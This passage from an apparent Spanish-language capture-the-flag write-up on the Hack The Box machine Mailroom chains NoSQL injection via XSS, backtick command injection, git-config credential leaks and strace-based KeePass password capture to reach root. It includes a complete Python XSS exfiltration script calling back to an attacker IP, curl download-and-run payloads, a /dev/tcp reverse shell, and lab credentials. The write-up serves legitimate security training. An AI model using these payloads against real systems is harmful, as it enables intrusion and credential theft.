+                <p>El token 2FA, sin embargo, se envía por correo — y por tanto es inalcanzable desde el exterior. Esto significa que el bypass por sí solo es insuficiente para obtener una sesión autenticada.</p>
+
+                <h2>Exfiltración Ciega de Contraseña NoSQL vía XSS</h2>
+                <p>En lugar de hacer bypass del login, la inyección puede abusarse para enumerar la contraseña real carácter a carácter usando el operador <code>$regex</code> de MongoDB. Probando anchors regex como <code>^a.*</code>, <code>^b.*</code>, etc., y observando si la respuesta contiene <code>"success":true</code> (lo que indica que el correo 2FA fue enviado, es decir, la credencial era correcta), es posible hacer fuerza bruta de la contraseña de a un carácter.</p>
+
+                <p>Como el bot procesa cada envío de forma independiente, esto se automatiza con un script Python que envía un payload XSS por cada carácter probado, espera el callback y avanza el prefijo conocido cuando hay coincidencia. Probando con varios correos de empleados visibles en la página confirma que <code>tristan@mailroom.htb</code> es una cuenta válida.</p>
+
+                <p>El script de exfiltración automatizada funciona así:</p>
+                <pre><code class="language-python">#!/usr/bin/env python3
+"""
+HTB Mailroom - XSS + NoSQL Injection Password Exfiltration
+Automates blind character-by-character password brute-force via XSS exfil.
+"""
+
+import threading
+import urllib.parse
+import requests
+import base64
+import time
+import sys
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+# ─── CONFIG ───────────────────────────────────────────────────────────────────
+TARGET_URL  = "http://mailroom.htb/contact.php"
+AUTH_URL    = "http://staff-review-panel.mailroom.htb/auth.php"
+EXFIL_HOST  = "10.10.14.195"   # Tu IP de tun0
+EXFIL_PORT  = 80
+EMAIL       = "tristan@mailroom.htb"
+MAX_RETRIES = 3
+TIMEOUT     = 8   # segundos esperando el callback XSS
+CHARSET     = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.&lt;&gt;?"
+# ──────────────────────────────────────────────────────────────────────────────
+
+callback_event   = threading.Event()
+callback_payload = None
+current_token    = None   # solo aceptar callbacks que coincidan con este token
+
+class ExfilHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        global callback_payload, current_token
+        if "?token=" in self.path and "&amp;resp=" in self.path:
+            try:
+                qs     = self.path.split("?", 1)[1]
+                params = dict(p.split("=", 1) for p in qs.split("&amp;"))
+                token  = params.get("token", "")
+                b64    = params.get("resp",  "")
+                if token != current_token:
+                    self.send_response(200); self.end_headers(); return
+                decoded = base64.b64decode(
+                    urllib.parse.unquote(b64)
+                ).decode("utf-8", errors="replace")
+            except Exception:
+                decoded = ""
+            callback_payload = decoded
+            callback_event.set()
+        self.send_response(200); self.end_headers()
+
+    def log_message(self, fmt, *args):
+        pass  # silenciar logs de acceso
+
+def start_server():
+    server = HTTPServer(("0.0.0.0", EXFIL_PORT), ExfilHandler)
+    t = threading.Thread(target=server.serve_forever, daemon=True)
+    t.start()
+    return server
+
+def build_xss_payload(regex: str, token: str) -> str:
+    script = (
+        f'&lt;script&gt;\n'
+        f'const req = new XMLHttpRequest();\n'
+        f'req.open("POST", "{AUTH_URL}", false);\n'
+        f'req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\n'
+        f'req.send("email={EMAIL}&amp;password[$regex]={regex}");\n'
+        f'\n'
+        f'const exfil = new XMLHttpRequest();\n'
+        f'exfil.open("GET", "http://{EXFIL_HOST}/?token={token}&amp;resp=" + btoa(req.responseText), true);\n'
+        f'exfil.send();\n'
+        f'&lt;/script&gt;'
+    )
+    return script
+
+def send_xss(regex: str) -> str | None:
+    global callback_payload, current_token
+    token           = str(time.time_ns())
+    current_token   = token
+    callback_payload = None
+    callback_event.clear()
+    xss  = build_xss_payload(regex, token)
+    data = {"email": "attacker@attacker.com", "title": "test", "message": xss}
+    try:
+        requests.post(TARGET_URL, data=data, timeout=10)
+    except requests.RequestException as e:
+        print(f" [!] POST error: {e}")
+        return None
+    triggered = callback_event.wait(timeout=TIMEOUT)
+    return callback_payload if triggered else None
+
+def is_correct(response: str) -> bool:
+    if response is None:
+        return False
+    return (
+        '"success":true' in response
+        and "2FA token" in response
+        and "Invalid email or password" not in response
+    )
+
+def test_char(regex: str) -> bool:
+    for attempt in range(1, MAX_RETRIES + 1):
+        resp = send_xss(regex)
+        if resp is not None:
+            return is_correct(resp)
+        print(f" [~] Sin callback (intento {attempt}/{MAX_RETRIES}), reintentando...")
+        time.sleep(1)
+    print(f" [!] Todos los reintentos agotados para regex: {regex}")
+    return False
+
+def re_escape(s: str) -> str:
+    special = r"\.+*?[](){}^$|"
+    result  = ""
+    for c in s:
+        result += ("\\" + c) if c in special else c
+    return result
+
+def brute_force_password() -> str:
+    password = ""
+    print(f"\n[*] Iniciando exfiltración de contraseña NoSQL para: {EMAIL}")
+    print(f"[*] Escuchando callbacks en {EXFIL_HOST}:{EXFIL_PORT}\n")
+    while True:
+        found_char = False
+        for ch in CHARSET:
+            regex = f"^{re_escape(password + ch)}.*"
+            print(f"[?] Probando: '{password}{ch}' (regex: {regex})", end="\r", flush=True)
+            if test_char(regex):
+                password   += ch
+                found_char  = True
+                print(f"\n[+] Carácter encontrado: '{ch}' → Contraseña hasta ahora: {password}")
+                break
+        if not found_char:
+            regex = f"^{re_escape(password)}$"
+            if test_char(regex):
+                print(f"\n[✓] Contraseña completa: {password}")
+            else:
+                print(f"\n[!] No se encontró el siguiente carácter. Contraseña hasta ahora: {password}")
+            break
+    return password
+
+if __name__ == "__main__":
+    print("[*] Iniciando listener de exfiltración...")
+    srv = start_server()
+    print(f"[*] Servidor HTTP escuchando en 0.0.0.0:{EXFIL_PORT}")
+    try:
+        pwd = brute_force_password()
+        print(f"\n[★] CONTRASEÑA FINAL: {pwd}")
+    except KeyboardInterrupt:
+        print("\n[!] Interrumpido por el usuario.")
+    finally:
+        srv.shutdown()</code></pre>
+
+                <p>El script expone un servidor HTTP en el puerto 80 para recibir los callbacks del XSS y usa lógica de retry para compensar los callbacks que ocasionalmente no llegan — una necesidad cuando el trigger es un bot automatizado y no un humano. El proceso es lento (un viaje de ida y vuelta HTTP por carácter), pero tras un buen rato se recuperan las siguientes credenciales:</p>
+
+                <pre><code class="language-plaintext">tristan@mailroom.htb : 69trisRulez!</code></pre>
+
+                <p>Incluso con estas credenciales, iniciar sesión en el panel sigue siendo imposible sin el token 2FA. Sin embargo, probar la reutilización de contraseña por SSH funciona inmediatamente:</p>
+                <pre><code class="language-bash">ssh tristan@mailroom.htb</code></pre>
+
+                <p>Se establece acceso SSH como <code>tristan</code>. Revisando <code>/var/mail/tristan</code> se confirma que los correos 2FA sí llegan aquí — por lo que si se hubiera tenido acceso shell desde el principio, el bypass NoSQL + token por email habría sido otra vía válida.</p>
+
+                <h2>Proxy SOCKS para Acceder al Panel Interno</h2>
+                <p>Con acceso SSH, el panel interno ya es accesible directamente. Como el servicio no está vinculado a un puerto específico que pueda reenviarse con un túnel <code>-L</code> simple (es enrutamiento basado en vhost a nivel web), un proxy SOCKS es el enfoque más limpio. Se actualiza el <code>/etc/hosts</code> de la máquina atacante para resolver el vhost interno a localhost:</p>
+                <pre><code class="language-plaintext">127.0.0.1  localhost staff-review-panel.mailroom.htb</code></pre>
+
+                <p>Luego se establece un túnel SOCKS dinámico sobre SSH:</p>
+                <pre><code class="language-bash">ssh -N -D 1080 tristan@mailroom.htb</code></pre>
+
+                <p>En Firefox, FoxyProxy se configura para enrutar el tráfico por <code>127.0.0.1:1080</code> (SOCKS5):</p>
+
+                <img src="./media/image1.png" alt="Configuración de FoxyProxy en Firefox mostrando un proxy SOCKS5 apuntando a 127.0.0.1 en el puerto 1080 para enrutar el tráfico a través del túnel SSH" />
+
+                <p>Es necesario un ajuste adicional en el <code>about:config</code> de Firefox para que la resolución DNS vaya a través del proxy (de lo contrario el vhost no resolverá correctamente):</p>
+                <pre><code class="language-plaintext">network.proxy.socks_remote_dns = true</code></pre>
+
+                <p>Con esto en su lugar, el panel de revisión del personal es completamente accesible. Muestra una interfaz de administración para revisar las consultas enviadas y expone un endpoint en <code>POST /inspect.php</code> donde el parámetro <code>inquiry_id</code> controla qué consulta se carga.</p>
+
+                <h2>Inyección de Comandos por Backtick — RCE como www-data</h2>
+                <p>El saneamiento aplicado a <code>inquiry_id</code> en el código fuente filtrado es el siguiente:</p>
+                <pre><code class="language-php">if (isset($_POST['inquiry_id'])) {
+    $inquiryId = preg_replace('/[\$&lt;&gt;;|&amp;{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
+    $contents  = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");
+}</code></pre>
+
+                <p>El regex elimina <code>$</code>, <code>&lt;</code>, <code>&gt;</code>, <code>;</code>, <code>|</code>, <code>&amp;</code>, <code>{}</code>, <code>()</code>, <code>[]</code> y comillas — pero de forma crítica <strong>no bloquea el carácter backtick</strong> (<code>`</code>). En bash, los backticks realizan sustitución de comandos exactamente igual que <code>$()</code>, por lo que el shell ejecutará lo que haya entre ellos.</p>
+
+                <p>Un ping-back simple confirma la ejecución:</p>
+                <pre><code class="language-plaintext">inquiry_id=`curl 10.10.14.55`</code></pre>
+
+                <p>El servidor HTTP del atacante recibe una conexión desde el objetivo, confirmando RCE. Para obtener una shell, primero se prepara un script de reverse shell en el servidor HTTP del atacante:</p>
+                <pre><code class="language-bash">bash -c "bash -i >& /dev/tcp/10.10.14.55/443 0>&1"</code></pre>
+
+                <p>Como el carácter pipe está bloqueado por el saneamiento, el payload se divide en dos peticiones — primero se descarga el script y luego se ejecuta:</p>
+                <pre><code class="language-plaintext">inquiry_id=`curl 10.10.14.55 -o /tmp/xd`
+
+inquiry_id=`bash /tmp/xd`</code></pre>
+
+                <p>Se recibe una reverse shell como <code>www-data</code> dentro de lo que parece ser un contenedor Docker (el hostname es una cadena hexadecimal corta, no hay sistema init real, etc.).</p>
+
+                <h2>Fuga de Credenciales en .git/config — Movimiento Lateral a matthew</h2>
+                <p>Explorando el sistema de ficheros del contenedor, el directorio de la aplicación web se encuentra en <code>/var/www/staffroom</code>. Es un repositorio git, y su archivo de configuración contiene la URL remota con credenciales embebidas:</p>
+                <pre><code class="language-ini">[core]
+    repositoryformatversion = 0
+    filemode = true
+    bare = false
+    logallrefupdates = true
+[remote "origin"]
+    url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git
+    fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+    remote = origin
+    merge = refs/heads/main
+[user]
+    email = matthew@mailroom.htb</code></pre>
+
+                <p>El <code>%23</code> en la URL es un símbolo de almohadilla (<code>#</code>) con codificación URL. Decodificándolo se obtiene:</p>
+                <pre><code class="language-plaintext">matthew : HueLover83#</code></pre>
+
+                <p>SSH como <code>matthew</code> requiere clave pública, pero cambiar de usuario desde la shell existente funciona perfectamente:</p>
+                <pre><code class="language-bash">su matthew</code></pre>
+
+                <p>Las credenciales son aceptadas y la sesión cambia a <code>matthew</code>. En este punto hay un archivo de base de datos KeePass visible en el directorio home:</p>
+                <pre><code class="language-bash">ls -lh ~
+# -rw-r--r-- 1 matthew matthew 2.0K Mar 16  2023 personal.kdbx</code></pre>
+
+                <h2>Contraseña Maestra de KeePass vía Trazado de Procesos con strace</h2>
+                <p>Los intentos iniciales de abrir <code>personal.kdbx</code> con <code>kpcli</code> fallan — las contraseñas conocidas no funcionan. Ejecutando <code>pspy64</code> para monitorizar los procesos en ejecución se descubre algo interesante: cada 30 segundos se lanza un proceso <code>kpcli</code> bajo el UID 1001 (matthew):</p>
+                <pre><code class="language-plaintext">CMD: UID=1001 PID=24427 | -bash -c /usr/bin/kpcli
+CMD: UID=1001 PID=24429 | /usr/bin/perl /usr/bin/kpcli</code></pre>
+
+                <p>Intentar abrir la base de datos manualmente ahora muestra una advertencia de archivo de bloqueo, indicando que otro proceso ya la tiene abierta:</p>
+                <pre><code class="language-plaintext">kpcli:/> open personal.kdbx
+WARNING: A KeePassX-style lock file is in place for this file.
+It may be opened elsewhere. Be careful of saving!
+Please provide the master password:</code></pre>
+
+                <p>Como <code>kpcli</code> es un script Perl que lee la contraseña desde la entrada estándar mediante <code>ioctl</code> (deshabilitando el eco del terminal), <code>strace</code> puede interceptar todas las llamadas al sistema incluyendo las lecturas de teclado carácter a carácter. Se ejecuta el comando hasta que se engancha a un proceso <code>perl</code> activo:</p>
+                <pre><code class="language-bash">strace -p $(pidof perl)</code></pre>
+
+                <p>La salida es extensa. Analizándola se observa la contraseña siendo leída un carácter cada vez con intervalos de sondeo de 50 ms, con un backspace a mitad para corregir un error de escritura. Reconstruyendo la secuencia:</p>
+
+                <blockquote>
+                    <p>Caracteres tecleados: <code>!sEcUr3p4$$w01</code> → retroceso (borra el <code>1</code>) → <code>r</code>, <code>d</code>, <code>9</code> → Enter.<br>
+                    Contraseña final: <code>!sEcUr3p4$$w0rd9</code></p>
+                </blockquote>
+
+                <p>Abrir la base de datos con esta contraseña maestra funciona:</p>
+                <pre><code class="language-plaintext">kpcli:/> open personal.kdbx
+Please provide the master password: *****************
+kpcli:/> ls
+=== Groups ===
+Root/
+kpcli:/> cd Root
+kpcli:/Root> ls
+=== Entries ===
+0. food account          door.dash.local
+1. GItea Admin account   git.mailroom.htb
+2. gitea database password
+3. My Gitea Account      git.mailroom.htb
+4. root acc</code></pre>
+
+                <p>La entrada "root acc" se muestra con el flag <code>-f</code> para revelar la contraseña:</p>
+                <pre><code class="language-plaintext">kpcli:/Root> show root\ acc -f
+
+Path:  /Root/
+Title: root acc
+Uname: root
+Pass:  a$gBa3!GA8
+URL:
+Notes: root account for sysadmin jobs</code></pre>
+
+                <p>Cambiar a root con <code>su root</code> e introducir <code>a$gBa3!GA8</code> funciona correctamente, obteniendo acceso completo al sistema.</p>
+            </div>
+
+        </article>
+    </main>
+
+    <script src="../../index.js"></script>
+</body>
+
+</html>
